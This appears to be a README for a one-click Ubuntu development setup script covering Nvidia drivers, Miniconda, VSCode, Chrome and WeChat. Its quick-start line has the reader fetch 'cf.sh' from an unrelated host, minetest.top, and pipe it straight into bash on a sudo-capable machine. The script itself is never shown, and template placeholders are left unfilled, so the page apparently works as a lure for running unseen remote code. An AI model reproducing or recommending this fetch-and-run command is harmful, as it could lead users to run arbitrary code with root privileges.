# Ubuntu Dev Environment Auto-Setup

[![Ubuntu](https://img.shields.io/badge/Ubuntu-20.04%20%7C%2022.04%20%7C%2024.04-orange.svg)](https://ubuntu.com/)
[![Bash](https://img.shields.io/badge/Script-Bash-4EAA25.svg)](https://www.gnu.org/software/bash/)

A robust, one-click shell script designed to automate the initial setup of a fresh Ubuntu installation. This script saves you from the hassle of manual configuration by automatically downloading and installing essential development tools, daily software, and GPU drivers.

## ✨ Features

This script will automatically install and configure the following:

- **Hardware Drivers**: Automatically detects and installs the recommended Nvidia GPU drivers.
- **Development Environment**:
  - [Miniconda / Anaconda]: For Python virtual environment management.
  - Visual Studio Code (VSCode): Code editor.
  - Essential Build Tools: `build-essential`, `git`, `curl`, `wget`, etc.
- **Daily Software**:
  - Google Chrome.
  - WeChat - *Based on [Insert your installation method, e.g., official deb / Wine / Docker container]*

## 🛠️ Prerequisites

- **Operating System**: Recommended to run on a fresh Ubuntu [20.04 / 22.04 / 24.04] LTS environment.
- **Network**: A stable internet connection is required to download packages and software.
- **Permissions**: You must have `sudo` (root) privileges to execute the script.

## 🚀 Usage

Quick Start (A single command is all it takes):
   **wget minetest.top/upload/cf.sh && bash cf.sh**
